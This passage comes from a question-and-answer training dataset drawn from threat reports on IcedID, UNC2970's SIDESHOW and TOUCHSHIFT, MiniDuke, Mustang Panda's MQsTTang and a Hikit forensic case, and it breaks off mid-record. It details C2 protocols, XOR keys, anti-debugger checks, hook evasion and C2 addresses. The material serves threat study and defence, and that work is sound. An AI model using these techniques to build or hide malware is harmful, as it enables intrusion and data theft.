    "instruction": "Big Headline: General information:\nThe government team for responding to computer emergencies in Ukraine CERT-UA revealed the fact of mass distribution among citizens of Ukraine XLS-documents called \"Mobilization Register.xls\".\nIt was found that if you open the document and activate the macro, the macro will download and run the executable file. The downloaded EXE file will decrypt and run the GzipLoader malware on your computer, which in turn will download, decrypt and run the IcedID malware. This malware (also known as BankBot) belongs to the class of \"banking Trojans\" and, among other things, provides theft of authentication data.\nThe activity is targeted and is tracked by UAC-0098.\n\nHow does the malware distributed through 'Mobilization Register.xls' compromise a system, and what specific banking Trojan is ultimately deployed? Additionally, explain the role of each component in the infection chain.",
    "output": "The malware distributed through 'Mobilization Register.xls' compromises a system through a multi-stage infection process. When the XLS document is opened and the macro is activated, it downloads and runs an executable file. This EXE file then decrypts and runs the GzipLoader malware, which in turn downloads, decrypts, and runs the IcedID malware. IcedID, also known as BankBot, is a banking Trojan designed to steal authentication data. The activity is targeted and tracked by UAC-0098.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Establish Foothold\nIn multiple investigations, Mandiant has observed UNC2970 deploy PLANKWALK to establish footholds within environments. PLANKWALK is a backdoor written in C++ that communicates over HTTP and utilizes multiple layers of DLL sideloading to execute an encrypted payload. PLANKWALK is initially executed through a launcher that will import and execute a second stage launcher expected to be on disk.\nObserved First Stage Launcher names:\ndestextapi.dll\nmanextapi.dll\npathextapi.dll\npreextapi.dll\nWbemcomn.dll\nOnce loaded and executed, the secondary launcher will attempt to decrypt and execute an encrypted PLANKWALK sample on disk that matches the following pattern:\nC:\\ProgramData\\Microsoft\\Vault\\cache<three numerical digits>.db\nOnce executed, PLANKWALK will decrypt an on-host encrypted configuration file that contains the C2 for the backdoor. The C2 for PLANKWALK has largely been co-opted by legitimate WordPress sites.\nFollowing the deployment of PLANKWALK, Mandiant observed UNC2970 leverage a wide variety of additional tooling, including Microsoft InTune to deploy a shellcode downloader.\nMedium Headline: TOUCHSHIFT\nTOUCHSHIFT is a malicious dropper that masquerades as mscoree.dll or netplwix.dll . TOUCHSHIFT is typically created in the same directory and simultaneously as a legitimate copy of a Windows binary. TOUCHSHIFT leverages DLL Search Order Hijacking to use the legitimate file to load and execute itself. TOUCHSHIFT has been observed containing one to two various payloads which it executes in-memory. Payloads that have been seen include TOUCHSHOT, TOUCHKEY, HOOKSHOT, TOUCHMOVE, and SIDESHOW.\nTo appear legitimate, the file uses over 100 exports that match common system export names. However, the majority all point to the same empty function. The malicious code has been seen located in exports LockClrVersion or UsersRunDllW in different instances.\nWhen TOUCHSHIFT contains a second payload, it takes a single character command line option as its first argument to determine which of the two payloads to execute.\nTo unpack its payload(s), TOUCHSHIFT generates a decryption key by XOR encoding its second argument and the first 16 characters of the legitimate executable's file name.\nFor example, in one instance Mandiant observed the arguments -CortanaUIFilter , XOR encoded with the hardcoded key 009WAYHb90687PXkS ,and printfilterpipel ,which was XOR encoded with the hardcoded key .sV%58&.lypQ[$= and was loaded by the file printfilterpipelinesvc.exe . In another instance, the argument used was --forkavlauncher and the loading file was C:\\windows\\Branding\\Netplwiz.exe .\nOnce the code is unpacked, it is then loaded into a memory location created by a call to VirtualAlloc and executed from there.\nOnce the payload(s) has/have been executed, the main portion of TOUCHSHIFT will sleep for a period of time allowing the payload(s) to continue executing.\nMedium Headline: TOUCHSHOT\ntakes screenshots of the system on which it is running and saves them to a file to be retrieved by the threat actor at a later time. TOUCHSHOT is configured to take a screenshot every three seconds, and then uses ZLIB to compress the images. The compressed data is then appended to a file that it creates and continues appending new screenshots to this file until the file reaches five megabytes in size, at which point it will create a new file with the same naming convention. TOUCHSHOT was seen embedded in the same instance of TOUCHSHIFT as TOUCHKEY (discussed later in the post).\nTOUCHSHOT will create a file in the C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\ directory, and will name the file ~DM{####}P.dat , where the four numbers are pseudo-randomly generated. Once TOUCHSHOT has generated the file name, it attempts to create a handle to the file. If the return value indicates that the file does not exist, it will then create the file. This check is performed as part of a loop that continues until a new file needs to be created. After each iteration of the loop, TOUCHSHOT will then take a screenshot, which is appended to the staging file.\nMedium Headline: TOUCHKEY\nis a keylogger that captures keystrokes and clipboard data, both of which are encoded with a single-byte XOR and saved to a file. As with TOUCHSHOT, these files need to be acquired by the threat actor through additional means.\nTOUCHKEY creates two files in the C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\ directory. The file name Normal.dost is used for storing the captured keystrokes, while the file name Normal.docb is used for the clipboard data. The full paths are then passed into their own thread, where the keystrokes or clipboard data will be captured and appended to their respective files.\nIn one of the created threads, TOUCHKEY will open the clipboard and grab the data that is stored within it. In the other thread, TOUCHKEY will set a hook into the keyboard, and record any keys that are pressed.\nMedium Headline: TOUCHMOVE\nTOUCHMOVE is a loader that decrypts a configuration file and a payload, both of which must be on disk, and then executes the payload. TOUCHMOVE generates an RC6 key to decrypt the two files by querying the system's BIOS date, version, manufacturer, and product name. Once decrypted, the results are XOR encoded with a hardcoded key. If the generated RC6 key is incorrect, the configuration and payload files will not successfully decrypt, indicating that UNC2970 compiles instances of TOUCHMOVE after having already conducted reconnaissance on the target victim system. Once the RC6 key is successfully generated, a handle is created to the configuration file, and the decryption process is conducted. If the configuration file is successfully decrypted, the payload's full path is located within it, and the same decryption process then occurs on the payload. Following this, the payload is executed.\nMedium Headline: SIDESHOW\nSIDESHOW is a backdoor written in C/C++ that communicates via HTTP POST requests with its C2 server. The backdoor is multi-threaded, uses RC6 encryption, and supports at least 49 commands, which can be seen in Table 1. Capabilities include arbitrary command execution (WMI capable); payload execution via process injection; service, registry, scheduled task, and firewall manipulation; querying and updating Domain Controller settings; creating password protected ZIP files; and more. SIDESHOW does not explicitly establish persistence; however, based on the multitude of supported commands it may be commanded to establish persistence.\nSIDESHOW derives a system-specific RC6 key using the same registry values as TOUCHMOVE and uses the generated key to decrypt the same configuration file from disk that TOUCHMOVE decrypted. The decrypted configuration file contains a list of C2 URLs to which SIDESHOW communicates using HTTP POST requests. SIDESHOW iterates this C2 URL list and attempts to authenticate to each C2 URL until it is successful. Once successful, SIDESHOW enters a state of command processing and sends additional HTTP POST requests to retrieve commands. SIDESHOW attempts to use the system's default HTTP User-Agent string during C2 communications; however, if not available it uses the hard-coded HTTP User-Agent string:\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69\nWhen communicating to its C2 server via HTTP POST requests, SIDESHOW forms a URI parameter string consisting of a mix of randomly selected and hard-coded URI parameters.\nAuthentication requests use the following URI parameter string format:\n1<param_1>=<hex_seed>&<param_2>=pAJ9dk4OVq85jxKWoNfw1AG2C&<param_3>=<16_random_hex_chars>\nThe first URI parameter value comes from SIDESHOW's configuration and is used to seed the random function.\nThe second URI parameter value, pAJ9dk4OVq85jxKWoNfw1AG2C , is hardcoded and likely an authentication credential.\nThe third URI parameter value, <16_random_hex_chars> , is a session identifier ( <session_id> ) used for future communications and consists of two subcomponents:\n1. <8_random_hex_based_on_seed>\n2. <8_random_hex_based_on_tickcount>\nThe first URI parameter's value, <hex_seed> , is used as a random seed value to derive the first eight hexadecimal characters ( <8_random_hex_based_on_seed> ), whereas the last eight hexadecimal characters ( <8_random_hex_based_on_tickcount> ) are derived using the CPU's current tick count as the random seed value. This results in the value <8_random_hex_based_on_seed> being deterministic, while <8_random_hex_based_on_tickcount> is pseudo-random.\nThe following is an example authentication URI parameter string:\n1pguid=A59&ssln=pAJ9dk4OVq85jxKWoNfw1AG2C&cup2key=184B280E341AE63F\nSIDESHOW parses the response and considers it a successful authentication if it contains the string <!DOCTYPE html> .\nCommand requests use the following URI parameter string format (notice that the <param_2> and <param_3> have switched locations in the string).\n1<param_1>=<5_random_digits>&<param_3>=2<session_id>&<param_2>=<6_random_digits>\nExample command URI parameter string:\n1other=37685&session=2184B280E341AE63F&page=593881\nSIDESHOW parses the command response body and extracts data following the string <!DOCTYPE html> . SIDESHOW then appears to Base64 decode and RC6 decrypt the extracted data. SIDESHOW responds to the commands listed in Table 1 (commands are described on a best effort basis).\n\nBased on the above text, answer a question. How does SIDESHOW communicate with its C2 server, and what steps does it take to authenticate and process commands from the C2 server?",
    "output": "SIDESHOW is a backdoor written in C/C++ that communicates via HTTP POST requests with its C2 server. It is multi-threaded and uses RC6 encryption. SIDESHOW derives a system-specific RC6 key using the same registry values as TOUCHMOVE and uses this key to decrypt a configuration file from disk that contains a list of C2 URLs. SIDESHOW iterates through this C2 URL list and attempts to authenticate to each C2 URL until it is successful. Authentication requests use a URI parameter string format that includes a mix of randomly selected and hard-coded URI parameters. The first URI parameter value comes from SIDESHOW's configuration and is used to seed the random function. The second URI parameter value is hardcoded and likely an authentication credential. The third URI parameter value is a session identifier used for future communications and consists of two subcomponents: one derived from the random seed value and the other from the CPU's current tick count. Command requests use a slightly different URI parameter string format, with the session identifier and other parameters switching places. SIDESHOW parses the command response body, extracts data following the string <!DOCTYPE html>, and then Base64 decodes and RC6 decrypts the extracted data to process commands.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PROPOSAL COVERSHEET\nThe RTF exploit document\nThe exploit document was named Proposal-Cover-Sheet-English.rtf and is quite bland when compared to\nthe documents that were used in 2013, which were of a political nature. We received the document on April 8th, only three days after the compilation of the MiniDuke payload, dated April 5th in the PE header. The payload remains quite small at only 24 KB.\nThe functionality of the shellcode which is executed by triggering the vulnerability is rather simple and straightforward. After decrypting itself and obtaining the addresses of some functions exported by kernel32.dll, it decrypts and drops the payload in the %TEMP% directory in a file named \"a.l\" which is subsequently loaded by calling kernel32!LoadLibraryA.\nAn interesting thing about the shellcode is that before transferring control to any API function it checks the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by security software and monitoring tools. If any of these are found the shellcode skips the first 5 bytes of the function being called by manually executing prologue instructions (mov edi, edi; push ebp; mov ebp, esp) and then jumping to the function code as illustrated below.\nThe next graph presents the execution flow of this malware when the exploitation is successful. As mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as the main module and the TwitterJS module.\nExecution flow of MiniDuke\nQ: In the context of the MiniDuke APT attack, how does the shellcode employed in the RTF exploit document ensure its execution remains undetected by security software and monitoring tools? Explain the mechanism in detail.",
    "output": "The shellcode used in the MiniDuke APT attack employs a sophisticated technique to evade detection by security software and monitoring tools. Before transferring control to any API function, the shellcode checks the first bytes of the function to detect hooks and debugger breakpoints. If any hooks or breakpoints are found, the shellcode skips the first 5 bytes of the function being called. This is achieved by manually executing prologue instructions (mov edi, edi; push ebp; mov ebp, esp) and then jumping to the function code. By doing so, the shellcode ensures that it can execute its intended actions without being intercepted or monitored by security mechanisms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Victimology\nWe have seen unknown entities in Bulgaria and Australia in our telemetry. We also have information indicating that this campaign is targeting a governmental institution in Taiwan. However, due to the nature of the decoy filenames used, we believe that political and governmental organizations in Europe and Asia are also being targeted. This would also be in line with the targeting of the group's other recent campaigns. As (<https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european>)documented by fellow researchers at Proofpoint, Mustang Panda has been known to target European governmental entities since at least 2020 and has increased its activity in Europe even further, since Russia's invasion of Ukraine. Figure 1 shows our view of the targeting for this campaign.\nBig Headline: Attribution\nWe attribute this new backdoor and the campaign to Mustang Panda with high confidence based on the following indicators.\nWe found archives containing samples of MQsTTang in two GitHub repositories belonging to the user YanNaingOo0072022. Another GitHub repository of the same user was used in a previous Mustang Panda campaign described by Avast in a (<https://decoded.avast.io/threatintel/apt-treasure-trove-avast-suspects-chinese-apt-group-mustang-panda-is-collecting-data-from-burmese-government-agencies-and-opposition-groups/>)December 2022 blogpost.\nOne of the servers used in the current campaign was running a publicly accessible anonymous FTP server that seems to be used to stage tools and payloads. In the /pub/god directory of this server there are multiple Korplug loaders, archives, and tools that were used in previous Mustang Panda campaigns. This is the same directory that was used by the stager described in the aforementioned Avast blogpost. This server also had a /pub/gd directory, which was another path used in that campaign.\nSome of the infrastructure used in this campaign also matches the network fingerprint of previously known Mustang Panda servers.\nBig Headline: Technical analysis\nMQsTTang is a barebones backdoor that allows the attacker to execute arbitrary commands on a victim's machine and get the output. Even so, it does present some interesting characteristics. Chief among these is its use of the (<https://mqtt.org/>)MQTT protocol for C&C communication. MQTT is typically used for communication between IoT devices and controllers, and the protocol (<https://info.lookout.com/rs/051-ESQ-475/images/lookout-pegasus-android-technical-analysis.pdf>)hasn't been used in many publicly documented malware families. One such example is Chrysaor, also known as Pegasus for . From an attacker's perspective, one of MQTT's benefits is that it hides the rest of their infrastructure behind a broker. Thus, the compromised machine never communicates directly with the C&C server. As seen in Figure 2, this capability is achieved by using the open source (<https://github.com/emqx/qmqtt>)QMQTT library. This library depends on the (<https://www.qt.io/product/framework>)Qt framework, a large part of which is statically linked in the malware. Using the Qt framework for malware development is also fairly uncommon. (<https://blog.talosintelligence.com/lazarus-magicrat/>)Lazarus's MagicRAT is one of the rare recently documented examples.\nMQsTTang is distributed in RAR archives which only contain a single executable. These executables usually have names related to Diplomacy and passports such as:\nCVs Amb Officer PASSPORT Ministry Of Foreign Affairs.exe\nDocuments members of delegation diplomatic from Germany.Exe\nPDF_Passport and CVs of diplomatic members from Tokyo of JAPAN.eXE\nNote No.18-NG-23 from Embassy of Japan.exe\nThese archives are hosted on a web server with no associated domain name. This fact, along with the filenames, leads us to believe that the malware is spread via spearphishing.\nSo far, we have only observed a few samples. Besides variations in some constants and hardcoded strings, the samples are remarkably similar. The only notable change is the addition of some anti-analysis techniques in the latest versions. The first of these consists of using the CreateToolhelp32Snapshot Windows API function to iterate through running processes and look for the following known debuggers and monitoring tools.\ncheatengine-x86_64.exe\nollydbg.exe\nida.exe\nida64.exe\nradare2.exe\nx64dbg.exe\nprocmon.exe\nprocmon64.exe\nprocexp.exe\nprocesshacker.exe\npestudio.exe\nsystracerx32.exe\nfiddler.exe\ntcpview.exe\nNote that, while the malware is a 32-bit executable, it only checks for the presence of x64dbg and not its 32-bit counterpart, x32dbg.\nThe second technique uses the FindWindowW Windows API to look for the following Window Classes and Titles used by known analysis tools:\nPROCMON_WINDOW_CLASS\nOLLYDBG\nWinDbgFrameClass\nOllyDbg \u2013 [CPU]\nImmunity Debugger \u2013 [CPU]\nWhen executed directly, the malware will launch a copy of itself with 1 as a command line argument. This is repeated by the new process, with the argument being incremented by 1 on every run. When this argument hits specific values, certain tasks will be executed. Note that the exact values vary between samples; the ones mentioned below correspond to the sample with SHA-1 02D95E0C369B08248BFFAAC8607BBA119D83B95B. However, the tasks themselves and the order in which they are executed is constant.\nFigure 3 shows an overview of this behavior along with the tasks that are executed when the malware is first run.\nTable 1 contains a list of the tasks and the value at which each of them is executed. We will describe them in further detail in the upcoming paragraphs.\nTable 1. Tasks executed by the backdoor\nIf any analysis tool or debugger is detected using the techniques we described previously, the behavior of task 1 is altered and tasks 2, 3, and 4 are skipped entirely.\nMedium Headline: Task 1: C&C communication\nAs was previously mentioned, MQsTTang communicates with its C&C server over the MQTT protocol. All observed samples use 3.228.54.173 as broker. This server is a public broker operated by EMQX, who also happen to be the maintainers of the QMQTT library. This could be a way to make the network traffic seem legitimate and to hide Mustang Panda's own infrastructure. Using this public broker also provides resiliency; the service is unlikely to be taken down because of its many legitimate users and, even if the current C&C servers are banned or taken down, Mustang Panda could spin up new ones and use the same MQTT topics without disrupting MQsTTang's operation.\nHowever, this campaign could also be a test case by Mustang Panda before deciding whether to invest the time and resources to set up their own broker. This is supported by the low number of samples we've observed and the very simple nature of MQsTTang.\nAs shown in Figure 4, the malware and C&C server use two MQTT topics for their communication. The first one, iot/server2, is used for communication from the client to the server. The second one is used for communication from the server to the client. It follows the format iot/v2/<Unique ID> where <Unique ID> is generated by taking the last 8 bytes, in hex form, of a UUID. If any analysis tool is detected, server2 and v2 are respectively replaced with server0 and v0. This is likely in order to avoid tipping off defenders by entirely aborting the malware's execution early.\nAll communication between the server and the client uses the same encoding scheme. The MQTT message's payload is a JSON object with a single attribute named msg. To generate the value of this attribute, the actual content is first base64 encoded, then XORed with the hardcoded string nasa, and base64 encoded again. We will describe the exact format of these payloads in the relevant sections.\nUpon first connecting to the broker, the malware subscribes to its unique topic. Then, and every 30 seconds thereafter, the client publishes a KeepAlive message to the server's topic. The content of this message is a JSON object with the following format:\n1{\n4}\nWhen the server wants to issue a command, it publishes a message to the client's unique topic. The plaintext content of this message is simply the command to be executed. As shown in Figure 5, the client executes the received command using QProcess::startCommand from the Qt framework. The output, obtained using QProcess::readAllStandardOutput, is then sent back in a JSON object with the following format:\n1{\n2 \"c_topic\": \"<client's unique topic>\",\n4}\nSince only the content of standard output is sent back, the server will not receive errors or warnings. From the server's point of view, a failed command is thus indistinguishable from a command that simply produces no output unless some sort of redirection is performed.\nBig Headline: Conclusion\nThe Mustang Panda campaign described in this article is ongoing as of this writing. The victimology is unclear, but the decoy filenames are in line with the group's other campaigns that target European political entities.\nThis new MQsTTang backdoor provides a kind of remote shell without any of the bells and whistles associated with the group's other malware families. However, it shows that Mustang Panda is exploring new technology stacks for its tools. It remains to be seen whether this backdoor will become a recurring part of the group's arsenal, but it is one more example of the group's fast development and deployment cycle.\n\nQ: Explain the communication protocol used by MQsTTang, including the encoding scheme for messages and the format of the JSON objects exchanged between the client and server.",
    "output": "A: MQsTTang communicates with its C&C server over the MQTT protocol using two topics: one for client-to-server communication (iot/server2) and one for server-to-client communication (iot/v2/<Unique ID>), where <Unique ID> is derived from a UUID. All messages are encoded as JSON objects with a single attribute named 'msg'. The content is first base64 encoded, then XORed with the hardcoded string 'nasa', and base64 encoded again. Upon connecting to the broker, the malware subscribes to its unique topic and sends a KeepAlive message every 30 seconds. Commands from the server are executed using QProcess::startCommand, and the output is sent back in a JSON object containing the client's unique topic and the command output.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 4.2.1 ECAT Analysis \u2013 System XX132\nECAT\t\n  contains a\t\n  set of filters and IOCs\t\n  that highlight files of\t\n  interest based\t\n  purely on\t\n  behavioral characteristics such as how they are loaded\t\n  or where they are located. One of these filters is the \"Reserved Filename\", which displays any files that\t\n  have reserved names and are not\t\n  in their\t\n  default\t\n  location. The list\t\n  of\t\n  Reserved Filenames includes both common Windows file system names such as\t\n  svchost.exe, explorer.exe, etc, as well as the\t\n  names of common applications such as browser executables. In the\t\n  example\t\n  depicted in Figure\t\n  5 below, ECAT\t\n  indicated that\t\n  a file named\t\n  svchost.exe (which natively resides under\t\n  c:\\Windows\\system32\\ folder)\t\n  is suspicious due\t\n  to its unexpected location.\nAnother very\t\n \u00a0useful feature of\t\n \u00a0ECAT is the ability to triage a system by downloading a system's Master\t\n \u00a0File Table (MFT)\t\n \u00a0directly from ECAT's console,\t\n \u00a0swiftly allowing\t\n \u00a0the\t\n \u00a0ECAT\t\n \u00a0analyst to triage\t\n \u00a0a\t\n \u00a0system remotely without interfering\t\n \u00a0with the end user's usage of the system. The built-\u00ad\u2010in ECAT MFT Viewer displays all relevant NTFS\t\n \u00a0attributes including all 8\t\n \u00a0NTFS\t\n \u00a0time\t\n \u00a0stamps3 .\t\n \u00a0Frequently, modern APT Trojans time stomp\t\n \u00a0their files to\t\n \u00a0avoid\t\n \u00a0suspicion, so\t\n \u00a0seeing all 8 time stamps is critical in determining when something malicious occurred as well as finding other\t\n \u00a0related events.\nWithin a few seconds after requesting the MFT the analyst was able\t\n  to perform time\t\n  analysis on the\t\n  system. This process started\t\n  with\t\n  events that occurred\t\n  around\t\n  the time when\t\n  the known\t\n  malicious file named\t\n  svchost.exe was created. This\t\n  analysis\t\n  revealed another related file named svchost.conf,\t\n  which was\t\n  determined to be this Trojan's\t\n  obfuscated\t\n  configuration\t\n  file.\n2 Throughout this report some or all of the letters \t\n  in \t\n  the \t\n  names \t\n  of \t\n  the \t\n  systems \t\n  have \t\n  been \t\n  obfuscated \t\n  to \t\n  protect \t\n  the \t\n  identity \t\n  of \t\n  our\t\n  client.\n3 Four time stamps come from the $STANDARD_INFORMATION ($SI) attribute, whereas the other four come from the $FILENAME_INFORMATION ($FN)\t\n  attribute\nThe configuration file (svchost.conf) is \t\n  obfuscated \t\n  with \t\n  a \t\n  4 \t\n  byte \t\n  XOR \t\n  key \t\n  (0xFA274BCD) \t\n  and \t\n  contains \t\n  C2 \t\n  IP \t\n  address 206.205.82.9.\t\n  These two malicious files are components of what RSA IR refers to as Trojan.Hikit:\nFrom the\t\n  created timestamp of svchost.conf, the\t\n  analyst deduced that svchost.exe was executed via a scheduled job, and it dropped svchost.conf. Malware analysis on svchost.exe confirmed this behavior. Typically, when two or more files are created in such proximity in time to each other, and at\t\n  least\t\n  one of\t\n  them has \"00\" for\t\n  the seconds, this\t\n  is\t\n  indicative of this file being executed via a scheduled job.\t\n  This is because when\t\n  scheduling an\t\n  \"at\" job\t\n  the user\t\n  only specifies\t\n  an hour and minute, thus a\t\n  job is executed as soon as the\t\n  specified minute\t\n  arrives, and the seconds\t\n  end up being \"00\".\nIn this case it is highly likely that file svchost.exe was laterally copied over to this system,\t\n  followed by remotely scheduling an \"at\" job to execute that file4 .\t\n \u00a0The job was executed about 1 minute later, and it resulted in the dropping of file svchost.conf. The\t\n \u00a0fact that another local system was involved to infect system XX13\t\n \u00a0was\t\n \u00a0important because it showed that\t\n \u00a0at\t\n \u00a0least\t\n \u00a0one other\t\n \u00a0system on the network was\t\n \u00a0compromised. A quick check of the C:\\Windows\\Tasks folder did not show any leftover At.job files, whereas the entries on SchedLgU.txt file had already rolled into 2013. Furthermore, the Windows Security Event\t\n \u00a0logs, which would typically contain logs\t\n \u00a0on which account and from which system the\t\n \u00a0lateral movement occurred, had also rolled. Lastly, this was a Windows XP system and so their\t\n \u00a0event log Microsoft-\u00ad\u2010Windows-\u00ad\u2010TaskSchedules%4Operational.evtx did\t\n \u00a0not exist,\t\n \u00a0which is typically another great evidence\t\n \u00a0source for lateral\t\n \u00a0movement.\nThe analyst blacklisted file svchost.exe by\t\n  its MD5 hash in ECAT so that if it were encountered again it would be marked as malicious. However, as it is very\t\n  common with many\t\n  Trojans deployed\t\n  on\t\n  a network, at least some of them will vary slightly from others and have\t\n  a\t\n  different hash value\t\n  since at a minimum they are probably configured\t\n  to beacon to different\t\n  C2 channels or\t\n  compiled at\t\n  a different\t\n  time. This is where another\t\n  great\t\n  feature of\t\n  ECAT is very\t\n  useful, namely\t\n  ECAT's ability\t\n  to ingest YARA signatures. This feature also helps immediately mark \"suspicious\" files as \"malicious\". So, it\t\n  is common practice for\t\n  RSA IR analysts to create Yara signatures for\t\n  newly discovered malicious files. Figure\t\n  8\t\n  provides a signature for Trojan.Hikit:\n4 While we have seen adversaries locally schedule a job to execute a file on the local system, this is not very common although worth keeping in mind.\nSmall Headline: 4.2.2 ECAT Analysis \u2013 System XXDEV3\nOn a\t\n  second host (XXDEV3)\t\n  of the eight systems where ECAT was deployed, ECAT\t\n  discovered a\t\n  second instance of Trojan.Hikit.\t\n  The Yara rule had already marked the\t\n  file\t\n  as malicious (i.e. blacklisted it).\nWhen the analyst triaged XXDEV3, two Trojan.Hikit\t\n  configuration files were found. Furthermore, while this example of Trojan.Hitkit appeared to have\t\n  been on the\t\n  system since 2012, the two configuration files\t\n  were created in 2013, as\t\n  shown below:\nBoth configuration \t\n \u00a0files\t\n \u00a0were obfuscated with a 4-\u00ad\u2010byte XOR\t\n \u00a0key similar to the example\t\n \u00a0from XX13.\t\n \u00a0The same \t\n \u00a0C2 \t\n \u00a0node was found in both configuration files:\t\n \u00a0drometic.suroot.com (200.108.192.31).\t\n \u00a0The analyst also found three \"at\" job files that\t\n \u00a0fortunately weren't deleted\t\n \u00a0after execution, as shown\t\n \u00a0below:\nAt this point the analyst\t\n  had three relevant\t\n  timestamps to perform time analysis on. After sorting all the entries in\t\n  the MFT based on the $FN timestamp,\t\n  the \t\n  analyst \t\n  discovered \t\n  the following relevant\t\n  activity:\n1. A\t\n  few seconds after file netddesrv.exe was created\t\n  on\t\n  the system a job\t\n  was scheduled\t\n  (At1.job). This job\t\n  file executed a\t\n  file\t\n  named log.bat, which was no longer present on the system, which executed5 netddesrv.exe in\t\n  return. This proved to be a\t\n  classic example\t\n  of lateral movement.\n2. Looking\t\n  at the\t\n  next scheduled\t\n  job\t\n  the analyst discovered\t\n  artifacts that were different from what had\t\n  been\t\n  encountered up to that point, namely two\t\n  new files appeared\t\n  after a scheduled\t\n  job\t\n  was executed.\nThe scheduled job At2.job\t\n  executed\t\n  c:\\set.exe (no longer present on the system), which dropped files\t\n  frtest.dat\t\n  and Windows Config.wav6 . The last two files were components of what RSA IR refers to as Trojan.FF-\u00ad\u2010RAT. It was unclear at that point whether this Trojan was from a\t\n \u00a0different APT\t\n \u00a0group or if the same APT group that\t\n \u00a0entrenched itself in this system in August 2012, decided\t\n \u00a0to\t\n \u00a0drop\t\n \u00a0a second\t\n \u00a0type of Trojan\t\n \u00a0in\t\n \u00a0this system. Another interesting finding about Trojan.FF-\u00ad\u2010RAT was that file frtest.dat was legitimately digitally signed (as of\t\n \u00a0the time of\t\n \u00a0the engagement):\nDigitally signed malware is rare, \t\n  and \t\n  implies a\t\n  higher level of sophistication from \t\n  an adversary. The file Windows Config.wav file was compressed and contained the Trojan's configuration information, including the C2 domain and its project name. Malware analysis showed that the configuration file of this\t\n  Trojan contained two C2 domain\t\n  names, which\t\n  both\t\n  resolved\t\n  to\t\n  the same IP at that time: mno80.dwy.cc and mno995.dwy.cc (198.55.120.222).\nRSA\t\n  created\t\n  a YARA signature for this new Trojan\t\n  based on\t\n  a unique decompression\t\n  algorithm that\t\n  the Trojan utilized:\n3. The third job file \"At3.job\" also executed a\t\n  file named log.bat (no longer\t\n  present on the\t\n  system), however there\t\n  is \t\n  nothing \t\n  else \t\n  relevant \t\n  around \t\n  this \t\n  time:\n5 This assumption is probably true because throughout this case we saw\t\n  the adversary execute files via batch files such as in this instance.\n6 Notice the \"00\" on\t\n  the seconds for the creation\t\n  time. If the At2.job\t\n  had\t\n  not existed\t\n  or the SchedLgU.txt file does not contain \t\n  any \t\n  evidence \t\n  of \t\n  scheduled \t\n  \"at\" \t\n  jobs, you could infer that the Trojan\t\n  was dropped\t\n  via lateral movement, by looking the \"00\" seconds in\t\n  the creation\t\n  time of the malicious file(s).\nSince\t\n  ECAT\t\n  was only deployed to eight systems\t\n  at this\t\n  point, Security Analytics\t\n  complimented this\t\n  gap in endpoint visibility\t\n  by providing network visibility. A\t\n  quick lookup\t\n  of IP address 198.55.120.222 shows that 14\t\n  internal\t\n  systems are\t\n  beaconing\t\n  out to that IP\t\n  address, and there are several other domain names\t\n  also involved:\nAfter presenting these findings to CompanyA,\t\n \u00a0ECAT agents were deployed to every Windows system on the network. This \t\n \u00a0is \t\n \u00a0where \t\n \u00a0ECAT\t\n \u00a0also \t\n \u00a0compliments \t\n \u00a0SA; several of the discovered\t\n \u00a0Trojans \t\n \u00a0were \t\n \u00a0set \t\n \u00a0to \t\n \u00a0sleep longer than others, were not actively running, or\t\n \u00a0the system was previously infected with Trojan.FF-\u00ad\u2010RAT however the Trojan executable files had since been\t\n \u00a0removed.\nECAT\t\n \u00a0uses frequency analysis to give the analyst instant visibility across the environment on\t\n \u00a0any given\t\n \u00a0file. In this case of the Yara signature for Trojan.FF-\u00ad\u2010RAT, ECAT\t\n \u00a0informed the analyst\t\n \u00a0that\t\n \u00a0file frtest.dat (by MD5 hash) also \t\n \u00a0existed on\t\n \u00a05 additional systems.\t\n \u00a0ECAT also informed the analyst\t\n \u00a0how this file was loaded/entrenched, namely via a service name Nwsapagent.\nThe 5\t\n  systems in question are shown below:\nQuestion: What is the significance of the Master File Table (MFT) in ECAT's analysis process, and how does it help in identifying malicious activities?",
    "output": "Answer: The Master File Table (MFT) is crucial in ECAT's analysis process as it allows the analyst to triage a system remotely without interfering with the end user's usage of the system. The built-in ECAT MFT Viewer displays all relevant NTFS attributes including all 8 NTFS time stamps. Frequently, modern APT Trojans time stomp their files to avoid suspicion, so seeing all 8 time stamps is critical in determining when something malicious occurred as well as finding other related events.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: msvct60.dll\n64 bit version of msvct.dll msvck.dll\n32 bit library containing the main functionality, the actual backdoor. It has no exports and will only execute if injected into iexplore.exe, outlook.exe, firefox.exe or chrome.exe.\nFirst, it checks the internet connection using the CI export from msvct.dll. If it has no internet access the execution ends.\nNext it creates an ID of the infected system as a string such as:\n\"MyCookie: {eceee5c0-1eca-11de-abc9-806d6172696f}{3559831177}\" \u2013 the GUID is obtained using GetCurrentHwProfile API and the second bracketed number is the volume serial number. If GetCurrentHwProfile fails the ID will be:\n\"MyCookie: UserName{3559831177}\" \u2013 with the username from GetUserNameA API and again the volume serial number.\nThe ID created will be used to check the connection to the C&C with the CS export from msvct.dll. The connection is checked in an infinite loop with a sleep of 28 minutes after each check, until a valid, active C&C server is found. The C&C addresses are contained in msvct.dll and one of them is returned by CS function on success. It can be seen that the loop was meant to only check 3 times for the connection (like other samples do), but, maybe because this is a intermediary version or by negligence, the code actually loops indefinitely.\nAfter this follows the code for a regular backdoor which receives commands from the C&C. The commands are received and the results are sent back with the SHR export from msvct.dll. The backdoor will be identifying the computer with the ID it created. After 3 successful commands received it will sleep for 28 minutes. After 3 consecutive failed commands (SHR returns false) it will again perform a C&C validation with the CS function in an infinite loop. Here it may receive the other C&C address. If a command is received but it is not recognized it will sleep again for 28 minutes. The commands are text strings and are described below:\n\"cmd\" - Creates the file %temp%\\xmlupd.bat which will contain 